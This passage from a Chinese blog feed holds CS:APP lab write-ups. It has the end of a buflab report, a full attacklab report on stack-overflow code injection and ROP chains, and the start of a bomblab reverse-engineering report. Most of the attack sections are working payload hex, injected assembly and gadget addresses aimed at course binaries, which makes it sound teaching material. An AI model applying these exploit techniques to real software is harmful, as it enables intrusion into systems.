src="https://i.loli.net/2021/04/29/ZFRstrT8QAubCkJ.png" alt="buflab_level2_2.png"></p><p>其实结果就很明显了，<code>0x804d100</code>就是全局变量的地址，另一个你把它转换成十六进制就是你的<code>cookie</code>，确定完这三个内容以后重写一下汇编代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movl $0x5e635f8a,0x804d100//在AT&amp;T汇编中，立即数一定要加$，不加代表是地址。</span><br><span class="line">push 0x8048c9d//此时不用考虑端序</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>这里略微再提一下查看汇编代码机器码的方法，具体操作可以看我上一篇博文。。</p><p><img src="https://i.loli.net/2021/04/29/ds1iuEKNWXGUJ3P.png" alt="buflab_level2_3.png"></p><p>还有一点需要确定的就是缓冲区字符的首地址了，因为返回地址要填这个才能把<code>eip</code>劫持到栈上执行,那么我现在获取的地址是<code>0x55683868</code>，这个每个人id不同貌似会有不太一样的。那么方法就是先确定ebp然后看看字符串开始的位置相对于ebp的偏移，就能轻松算出来了。还有一个比较一般的方法应该适合大部分人，先<code>b getbuf</code>然后运行到gets函数之后观看栈的情况。如下图：</p><p><img src="https://i.loli.net/2021/04/29/A8cIFe3BvY7PSyT.png" alt="buflab_level2_4.png"></p><p>就可以很轻松地确定了，当你不确定自己填的返回地址是不对的情况下，这个方法百分百没错，那么我们的payload就是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">c7 04 25 00 </span><br><span class="line">d1 04 08 8a </span><br><span class="line">5f 63 5e 68 </span><br><span class="line">9d 8c 04 08 </span><br><span class="line">c3 00 00 00 //inject code</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00 </span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">68 38 68 55//address of String&#x27;s top</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/29/D8Gm2SjunFXxQtd.png" alt="buflab_level2_5.png"></p><h2 id="level3-Dynamite"><a href="#level3-Dynamite" class="headerlink" title="level3:Dynamite"></a>level3:Dynamite</h2><p>这一关咱们需要再不破坏原有栈帧的情况下将返回值修改成我们自己的<code>cookie</code>，这十分符合一个黑客的作为，咱们身为黑客就该神不知鬼不觉的去拿到<code>shell</code>，不然容易被打awa，打<code>ctf-pwn</code>题的我们基本都是能获取<code>shell</code>什么事都干得出来。破坏了原本结构？关我啥事，我拿到了<code>shell</code>就够了。</p><p>言归正传，在这里其实<code>gdb</code>就特别好用，因为我能知道它函数返回地址在哪，我只需要查一下调用这个函数的主函数，看看调用函数前存了些什么东西进去就可以很清楚的知道了。但是呢，我们一定还是要先溢出，不然都没办法劫持<code>eip</code>了，至于破坏的内容可以在代码注入里面去修复。就可以写出我们要注入的代码就是:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">movl your cookie,%eax</span><br><span class="line">movl original ebp address,%ebp</span><br><span class="line">push original eip</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>那么我们只需要找到原来的<code>ebp</code>和<code>eip</code>就可以实现攻击了,那我们就先给<code>getbuf()</code>的第一句下个断点看看此时<code>ebp</code>的值，<code>getbuf</code>的反汇编结果见上面的图。<code>b *0x80491f4</code>断住查看 <code>esp</code>的值。</p><p><img src="https://i.loli.net/2021/04/29/gx6R1cHPh3iQuMA.png" alt="buflab_level3_1.png"></p><p>可以很清楚地看到esp</p><p>至于<code>epi</code>，可以返回汇编它的父函数，可以看到<code>call</code>完<code>getbuf()</code>的下一条指令地址，这个应该就是之前保存的返回地址了。</p><p><img src="https://i.loli.net/2021/04/29/VWAo9rX3JPUuhqT.png" alt="buflab_level3_2.png"></p><p>这里讲一下函数调用的机制，先是传参数，32位的程序是从左到右依次入栈，64位的程序则是前六个参数分别进入<code>rdi,rsi,rdx,rcx,r8,r9</code>寄存器，参数多于六个再从右往左依次入栈。接下来保存调用该函数语句下一句的指令地址存在栈上，这个就是所谓的返回地址了。至于接下来的事，那就是在函数里面了，分别有保存父函数的栈帧情况，计算完成后返回值保存在<code>eax</code>寄存器之后先恢复父函数的栈帧情况(弹出<code>ebp</code>，<code>esp</code>+对应的值)，弹出<code>eip</code>。</p><p>那么注入的代码就很清楚了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">movl $0x5e635f8a,%eax</span><br><span class="line">movl $0x556838c0,%ebp</span><br><span class="line">push $0x08048dbe</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>运行一遍看看，完美！！！</p><p><img src="https://i.loli.net/2021/04/29/VH8wgMDON5KPln4.png" alt="buflab_level3_3.png"></p><h2 id="Level-4-Nitroglycerin"><a href="#Level-4-Nitroglycerin" class="headerlink" title="Level 4: Nitroglycerin"></a>Level 4: Nitroglycerin</h2><p>这一关，这一关你需要使用<code>./bufbomb -n</code>去执行，加了参数之后就不会执行<code>test()</code>函数了，而是<code>testn()</code>函数，调用<code>getbufn()</code>函数并且使它返回你的<code>cookie</code>，乍一听跟<code>level3</code>咋一模一样，但是自己调试一遍就会发现它要求你输入五次，并且每次的栈帧都不一样，我测试了一遍，每一次的字符串起始位置值是分别是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x55683688</span><br><span class="line">0x55683658</span><br><span class="line">0x55683668</span><br><span class="line">0x55683628</span><br><span class="line">0x55683688</span><br></pre></td></tr></table></figure><p>那么我们注入的代码就不能直接<code>mov $xxxx,%ebp</code>了，得靠点其它东西，想想函数调用的过程，是有一个过程叫</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">push %ebp</span><br><span class="line">mov %esp,%ebp</span><br><span class="line">sub $xxx,%ebp</span><br><span class="line">//调用过程</span><br><span class="line">add $xxx,%ebp</span><br><span class="line">pop %ebp</span><br></pre></td></tr></table></figure><p>我们发现调用的过程中，只有栈是被我们破坏了，寄存器是完好无损的，但是<code>ebp</code>寄存器有一个取栈上数据的操作，但是<code>esp</code>寄存器至始至终是完好的呀。因此我们只要让<code>ebp</code>为<code>esp+0x28</code>(因为<code>testn()</code>在调用前申请了<code>0x24</code>的空间，再加上保存的<code>ebp</code>就是<code>0x28</code>)就行了，但是注意取的是地址，用<code>lea</code>指令，然后就是<code>eip</code>了，这没什么好说的，看看调用这个函数的下一句是什么就行了。但是注意，我们返回的地址也是要有讲究的，因为每一次都不一样，我们得靠<code>nop</code>指令。计算机执行<code>nop</code>指令除了内部一个计数器+1以外不会有任何操作，并且只占用一个字节<code>90</code>，而且刚刚好<code>getbuf()</code>函数它开的很大，给了我们充足的滑行距离。注入的代码我们尽量靠近栈底，然后返回的地址尽量选取最小的(0x55683860)，以便于覆盖所有的情况。那我们注入的代码就是:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov $0x5e635f8a,%eax</span><br><span class="line">lea 0x28(%esp),%ebp</span><br><span class="line">push $0x08048e3a</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>然后确定一下字节大小</p><p><img src="https://i.loli.net/2021/04/29/PGniK5S9eMjBR2U.png" alt="buflab_level4_1.png"></p><p>字符是从<code>0x208</code>的内存开始的，再加上<code>ebp</code>那就是<code>0x20c</code>的大小了，不同的是：那些我们都填充<code>90</code>就行了，<code>payload</code>就是</p><p><img src="https://i.loli.net/2021/04/29/dI7VyMspTgkN1Pa.png" alt="buflab_level4_2.png"></p><p>填充代码+代码长度为<code>0x20c</code>就好了。</p><p>然后，我就默默地调了两个小时的代码，去查了<code>wp</code>才发现，32位汇编和64位汇编的lea指令是不一样的，原来我就没注意这点<code>qwq</code>默默地枯了！！</p><p><img src="https://i.loli.net/2021/04/29/auI7AecP4CnKrUv.png" alt="buflab_level4_3.png"></p><p>然后就又是漫长的调试过程，我一直以为输入<code>r -u xiaoji233 -n &lt;attackraw4.txt</code>就可以了，没想到只输入一次，就是说每次都只有第一个是对的，一定要换这种命令才可以将字符串复制五次输入的，踩过的坑千万别踩，否则后果就是罚坐三小时，让大家康康我的撒花吧！！！</p><p><img src="https://i.loli.net/2021/04/30/oaBdniV29RuOLN4.png" alt="buflab_level4_4.png"></p><p>本作者在写wp的时候喜欢加上自己的思考，因为我也是新手，这篇wp对新手就比较友好，因为大概率是可以踩到目前新手能踩到的大部分坑的，如果哪里说的不对，恳请指正！</p>]]></content>
      
      
      <categories>
          
          <category> csapp </category>
          
          <category> lab </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>attacklab实验报告:代码注入以及rop攻击</title>
      <link href="/2021/04/25/attqacklab/"/>
      <url>/2021/04/25/attqacklab/</url>
      
        <content type="html"><![CDATA[<p>今天来康康attack lab啊</p><span id="more"></span><h2 id="Ctarget"><a href="#Ctarget" class="headerlink" title="Ctarget"></a>Ctarget</h2><h3 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h3><p>题目给出函数<code>test</code>，<code>test</code>里面有函数<code>getbuf</code>，然后它给定的提权函数是<code>touch1()</code>，我们那我们先<code>gdb ctarget</code>进入调试，然后输入<code>disassemble getbuf</code>查看汇编代码。</p><p><img src="https://i.loli.net/2021/04/26/4rX8hQMRAoB9g6k.png" alt="attacklab_Ctarget_level1_1.png"></p><p>可以很清楚的看到函数的缓冲区大小是<code>0x28</code>字节，然后<code>gets</code>已经说明是库的标准函数了，<code>gets</code>函数是有漏洞的，它在读入字符串的时候不会对长度检测，而是给多少读多少。那么我们可以用这个<code>gets</code>来实现栈溢出，执行我们的权限函数<code>touch1()</code>，我们可以先用<code>00</code>字节填充<code>40</code>个字节，然后再加上<code>shell</code>函数的地址。注意前面可以用除了<code>0a</code>的任意字节填充，因为<code>0a</code>代表<code>’\n’</code>的意思，<code>gets</code>函数一旦读到这个字符就会认为字符串读取结束了。我们用<code>print touch1</code>去查看该函数的地址。</p><p><img src="https://i.loli.net/2021/04/26/tsoDagXldAT5NYC.png" alt="attacklab_ctarget_level1_2.png"></p><p>发现了提权函数的地址之后我们就可以构造<code>payload</code>了。我们先<code>q</code>退出<code>gdb</code>，然后这里先创建一个文本文件<code>vim attack1.txt</code> 然后填充</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">c0 17 40</span><br></pre></td></tr></table></figure><p>注意，地址在计算机里是<strong>小端序</strong>存储。也就是<strong>高地址存储高位字节</strong>，然后我们构造的<code>payload</code>是往<strong>栈底方向</strong>填充的，而栈又是<strong>向低地址增长</strong>的，因此如此反转过后我们的函数地址要按字节倒着填充。然后根据字节生成字符串文件。</p><p>运行题目给的<code>hex2raw</code>文件，<code>./hex2raw &lt;source file&gt; target file</code>命令去生成目标文件。然后再<code>./ctarget -q -i target file</code>这里我生成的文件名叫<code>attackraw1.txt</code>，然后终端输入运行命令，发现攻击成功了。</p><p><img src="https://i.loli.net/2021/04/26/vY3tahzlkjQudCZ.png" alt="attacklab_ctarget_level1_3.png"></p><h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><p>这个需要攻击执行的函数名为<code>touch2()</code>，这个栈溢出的漏洞依然可以利用。但是<code>print touch2</code>之后你就会发现，<code>touch2</code>比<code>touch1</code>多了一个参数。故技重施之后发现：</p><p><img src="https://i.loli.net/2021/04/26/LAOwMRtHp97zThr.png" alt="attacklab_ctarget_level2_1.png"></p><p>虽然我们成功执行了<code>touch2()</code>函数，但是还是失败了，发现<code>touch2()</code>事实上那个参数是用来检测是否与<code>cookie</code>匹配的，而<code>cookie</code>的值已经告诉你了。在32位的程序里面，我们可以往返回地址后面写上<code>cookie</code>作为参数，但是64位程序前6个参数采用寄存器传参，那么要成功攻击就必须修改<code>rdi</code>寄存器的值为<code>cookie</code>。因为我们直接在返回位置覆盖函数地址，跟普通调用的区别就少了参数的传递，所以rdi的值至少在执行getbuf函数的时候不会看遍，这里有40字节大小的栈空间，那么我们就可以往栈中注入代码，代码应该是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movq $0x59b997fa,%rdi</span><br><span class="line"></span><br><span class="line">call $touch2</span><br></pre></td></tr></table></figure><p><code>call</code>命令的操作数是根据<code>rip</code>偏移来的，那确定不了这个偏移，就没办法准确的<code>call</code>到这个<code>touch2()</code>函数，那么换一个思路：先往栈上堆返回地址，再返回<code>ret</code>弹出返回，那么我们在往栈上注入代码就是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movq $0x59b997fa,%rdi</span><br><span class="line">pushq $0x4017ec</span><br><span class="line">retq</span><br></pre></td></tr></table></figure><p>就完成了，再加上填充字节总共40字节再在末尾返回栈地址就可以直接执行刚刚注入的代码了。我们接下来就要确定栈的地址了。<code>gdb ctarget </code>然后在<code>getbuf</code>这里下断点.<code>r -q</code>运行到<code>sub rsp,0x28</code>这一步我们观察栈指针的位置</p><p><img src="https://i.loli.net/2021/04/26/51MLvTDFXRdAIjK.png" alt="attacklab_ctarget_level2_2.png"></p><p>那么我们可以在返回地址的位置指向栈中我们堆的代码的位置，让它执行这些指令，以此达到传参且执行函数的目的。依然要注意小端问题。接下来我们只需要解决一个问题：如何把汇编代码转换为字节码？</p><p>先<code>vim 1.s</code>，填入汇编代码，然后<code>gcc -c 1.s -o 1.o</code>汇编之后，再<code>objdump -d 1.o</code>反汇编就可以查看汇编代码的字节码了。</p><p><img src="https://i.loli.net/2021/04/26/b7dpJR2DMv8N3k5.png" alt="attacklab_ctarget_level2_4.png"></p><p>易得<code>payload</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 fa 97 b9 59 68</span><br><span class="line">ec 17 40 00 c3 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55</span><br></pre></td></tr></table></figure><p>可以看到，攻击成功了。</p><p><img src="https://i.loli.net/2021/04/26/mbuiMhVOGQY2Tca.png" alt="attacklab_ctarget_level2_3.png"></p><h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><p>这里的提权函数是<code>touch3</code>，<code>writeup</code>中已经给了我们函数的语句(Ps:我做到这里才知道writeup是说明的意思qwq)。</p><p><img src="https://i.loli.net/2021/04/26/R37sHQJ1e5FWf2n.png" alt="attacklab_Ctarget_level3_1.png"></p><p>要求<code>hexmatch</code>函数返回<code>true</code>，这次攻击才能成功，题目也给了我们这个函数的语句。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall hexmatch(unsigned int val, char *sval)</span><br><span class="line">&#123;</span><br><span class="line">  const char *v2; // rbx</span><br><span class="line">  char cbuf[110]; // [rsp+0h] [rbp-98h] BYREF</span><br><span class="line">  unsigned __int64 v5; // [rsp+78h] [rbp-20h]</span><br><span class="line">  v5 = __readfsqword(0x28u);</span><br><span class="line">  v2 = &amp;cbuf[random() % 100];</span><br><span class="line">  __sprintf_chk(v2, 1LL, -1LL, &quot;%.8x&quot;, val);</span><br><span class="line">  return strncmp(sval, v2, 9uLL) == 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数两个输入，一个就是<code>val</code>，那么实参就是<code>cookie</code>的值，已经确定了改不了了，<code>sval</code>参数是<code>touch3()</code>原参数给的，因此我们在<code>call touch3</code>的时候给<code>rdi</code>传的参数就可以是<code>hexmatch</code>的第二个参数。中间有一步是徐晃一枪，那就是这个随机函数了，但是接下来有一个<code>sprintf</code>函数，<code>sprintf</code>函数是将格式化字符串输出给<code>s</code>。那么把<code>val</code>以<code>8</code>位十六进制数给<code>s</code>的意思就是<code>s=&quot;59b997fa&quot;</code>,所以<code>s</code>字符串看似随机实则固定的。字符串传参是传字符串首字符的<code>char</code>指针，数值为首字符到<code>’\0’</code>之间的所有字符（大端序）。那么我们构造的<code>sval</code>字符串的字节码就要应该是：<code>35 39 62 39 39 37 66 61</code>，知道了要构造的字符串之后还要想办法将它作为参数传到<code>rdi</code>里面。我们可以将它保存到栈中的某个位置，因为在调用函数的时候<code>getbuf</code>栈帧的部分可能会因为正常调用<code>hexmatch</code>函数被破坏，所以我们在缓冲区下<code>4</code>个字节填充所需的字符串，就算破坏其它栈帧也没有关系，只要能执行就<code>ok</code>。那么很容易构造<code>payload</code>：在这里要注入的代码跟原来差不多，只是参数要变成<code>cookie</code>字符串的首地址。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 a8 dc 61 55 68 </span><br><span class="line">fa 18 40 00 c3 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00 </span><br><span class="line">35 39 62 39 39 37 66 61 </span><br><span class="line">00</span><br></pre></td></tr></table></figure><p>注意最后一位要<code>00</code> 填充，因为字符串是要到<code>00</code>才结束的，如果不是那么就会一直进行下去。</p><h2 id="rtarget"><a href="#rtarget" class="headerlink" title="rtarget"></a>rtarget</h2><h3 id="level2-1"><a href="#level2-1" class="headerlink" title="level2"></a>level2</h3><p>这个官方的<code>writeup</code>已经明确说了，栈只读，因此得采取<code>rop</code>的方式取攻击执行<code>touch2()</code>。</p><p>我们使用<code>objdump -d rtarget</code>去查看代码碎片看看哪里可以利用。首先我们想的应该是，<code>movq $0x59b997fa,%rdi</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pushq $0x4017ec</span><br><span class="line">retq</span><br></pre></td></tr></table></figure><p>但是发现你根本找不到<code>movq $0x59b997fa,%rdi</code>，所以这个方法略掉。</p><p>那还有<code>plan B</code>：在栈上<code>rsp</code>里面装入那个数然后<code>popq</code>弹到<code>rdi</code>里面就好了，那么我们想的就是，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">popq %rdi</span><br><span class="line">pushq $0x4017ec</span><br><span class="line">retq</span><br></pre></td></tr></table></figure><p>我们搜索一下<code>popq %rdi </code>的字节码<code>5f</code>，发现<code>0x40233a</code>有一个5f的</p><p>那就很容易构造<code>payload</code>了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">3a 23 40 00 00 00 00 00</span><br><span class="line">fa 97 b9 59 00 00 00 00</span><br><span class="line">ec 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/26/kCrAciSvRxqJgWs.png" alt="attacklab_rtarget_level2_1.png"></p><p>事实上这里我是没有攻击成功的，我觉得从逻辑上来讲是没有任何问题的，有大佬看到蒟蒻的小错误恳请帮忙指正。那么正确的做法是先把它pop到rax寄存器里面，然后执行<code>movq %rax,%rdi</code>然后再<code>ret touch3()</code>？？？到底有啥区别嘛，还是搞不懂。。</p><p>那么代码就是:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">popq %rax</span><br><span class="line">movq %rax,%rdi</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>构造出来的payload就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">ab 19 40 00 00 00 00 00</span><br><span class="line">fa 97 b9 59 00 00 00 00</span><br><span class="line">a2 19 40 00 00 00 00 00</span><br><span class="line">ec 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure><p>这个应该不难，但是我还是想知道我的哪里有问题！！！</p><h3 id="level3-1"><a href="#level3-1" class="headerlink" title="level3"></a>level3</h3><p>首先想想我们要干嘛？构造在一个特殊的地方构造字符串然后把字符串字符首地址传给<code>rdi</code>就能直接攻击成功。开启了栈只读和地址随机化，那么我们还是只能通过栈去溢出，肯定是要先把字符串写在后面，中间全是<code>gadget</code>。然后通过确定<code>rsp</code>的值以及我们已构造的<code>gadget</code>，我们就可以很轻松地获得字符串地址。</p><p>那么我们需要的汇编代码就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//movq %rsp,%rdi</span><br><span class="line">movq %rsp,%raxa</span><br><span class="line">movq %rax,%rdi</span><br><span class="line">add $offset,%rdi</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>这里主要是add这条指令，别问我为什么刚才的思路打断了，都是上面那个<code>level2</code>搞得，就佛系一点把，先把它传给<code>rax</code>再给<code>rdi</code>也一样的，即使我不知道一步到位为什么不行。接下来是寻找<code>gadget</code>了。其它的都能很好找到，唯独<code>add</code>这条指令不好搞，但是我们可以大致看一下规律。</p><p><img src="https://i.loli.net/2021/04/26/Sl1a8dpCuFRA7jO.png" alt="attacklab_rtarget_level3_1.png"></p><p>我们可以很清晰地发现，<code>add $xxx,%rdi</code>的一般规律就是 <code>48 83 c7</code> 然后后面一个字节确定立即数的大小那么就去搜索一下<code>48 83 c7</code>，但是很快就会发现，搜不到这个<code>gadget</code>。那么换一种思路，既然我们先传给了<code>rax</code>那我们可以先让<code>rax</code>加上那个值啊。说干就干，汇编再反之后得到字节码<code>48 05 00</code>发现还是找不到，一筹莫展之际，你突然想到，可以利用寄存器的低位，他们的操作码也有很大区别的，比如<code>rax</code>的低32位是<code>eax</code>，低16位是<code>ax</code>，低8位是<code>al</code>，我们一个个找过去发现add al有一个。04 37 这刚好是al+0x37的gadget。</p><p><img src="https://i.loli.net/2021/04/26/PiXlM34VsBgL1qT.png" alt="attacklab_rtarget_level3_2.png"></p><p>这个大小也是非常合适的，在尽量保证能够全覆盖的情况下保证<code>payload</code>越小越好，大了容易出事。</p><p>那么如此我们就只到我们重新堆的代码结构了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">movq %rsp,%rax</span><br><span class="line">add $0x37,al</span><br><span class="line">movq %rax,%rdi</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>cookie</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">06 1a 40 00 00 00 00 00// movq %rsp,%rax</span><br><span class="line">d8 19 40 00 00 00 00 00// add $0x37,al</span><br><span class="line">c5 19 40 00 00 00 00 00// movq %rax,%rdi</span><br><span class="line">fa 18 40 00 00 00 00 00//touch3</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 35//cookie</span><br><span class="line">39 62 39 39 37 66 61 00</span><br></pre></td></tr></table></figure><p>然后完结撒花啦！！</p><p>第一次能自己写完csapp的lab，虽然难，但是收获颇丰，若有不正，恳请指正！！</p>]]></content>
      
      
      <categories>
          
          <category> csapp </category>
          
          <category> lab </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>bomblab实验报告:二进制安全与逆向分析</title>
      <link href="/2021/04/19/bomblab/"/>
      <url>/2021/04/19/bomblab/</url>
      
        <content type="html"><![CDATA[<p>先观察给的.c文件，发现是要输入六组语句并且判断正误的，并且很容易发现判断函数phase_i(i=1,2…6)要有一个错误，炸弹即爆炸，那我们就要用到gdb调试了,在终端输入<code>gdb bomb</code>进入调试</p><span id="more"></span><h2 id="phase-1"><a href="#phase-1" class="headerlink" title="phase_1"></a>phase_1</h2><p>首先在phase_1处断点（命令：<code>b phase_1</code>）找到phase_1的拆弹语句。然后<code>r</code>运行，先随便输入点东西这里我输入了很多a,断在该处之后单步调试，因为要进入函数内部，我们用命令<code>step</code>或者<code>s</code>进行单步调试。调试发现一个<code>strings_not_equal</code>函数，跟进去看发现寄存器<code>rdi</code>为我们输入的很多个a，而寄存器<code>rsi</code>已经有了一句话。</p><p><img src="https://i.loli.net/2021/04/25/dVN392JXrMQjDwu.png" alt="bomblab_phase_1_1.png"></p><p>那么能直接断定这个就是我们的拆弹语句，重新调试进去输入那个语句<code>Border relations with Canada have never been better.</code>发现成功拆掉了这个炸弹，那么phase_1就拆掉了。</p><h2 id="phase-2"><a href="#phase-2" class="headerlink" title="phase_2"></a>phase_2</h2><p>拆完了之后就看向phase_2，我们先<code>delete</code>    清除所有断点然后<code>b phase_2</code>新增断点，<code>r</code>之后先输入之前的拆弹语句来到phase_2，我们照例输入很多的a，<code>s</code>单步调试进去发现有一个函数叫<code>read_six_numbers</code>，跟进去发现</p><p><img src="https://i.loli.net/2021/04/25/J7O8Yjl9kKnC1SN.png" alt="bomblab_phase_2_1.png"></p><p>调用了<code>scanf</code>函数并且能看到参数<code>%d %d %d %d %d %d</code>，那无疑我们这次应该输入六个整数。那就先猜，就先输入6个0也罢，但此时我们不能’s’单步调试了，因为<code>scanf</code>内部构造很复杂，<code>s</code>单步调试会把你键盘按烂的。因此我们用<code>next</code>或<code>n</code>单步调试，跳过了<code>scanf</code>函数的内部，成功给了6个整数，然后继续调试，发现</p><p><img src="https://i.loli.net/2021/04/25/Kil6fnbgrRJH4hm.png" alt="bomblab_phase_2_2.png"></p><p><code>ptr[rsp]=1</code>才能跳转避免执行到<code>explode</code>函数，我们稍微调试一下也可以发现<code>ptr[rsp]</code>存了第一个输入的数值，那么就可以很容易得到第一个整数是<code>1</code>，我们把第一个值改成1，其它的照常不变，发现第一个数躲过了爆炸，那么说明我们的方案可行，接下来只需要把剩下五个数判断完了就可以了。继续<code>n</code>单步调试，发现第二个测试的数是</p><p><img src="https://i.loli.net/2021/04/25/HRzX9CYaBQLN1Sc.png" alt="bomblab_phase_2_3.png"></p><p>一样的是比较<code>eax</code>上面我们可以看到有一个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add 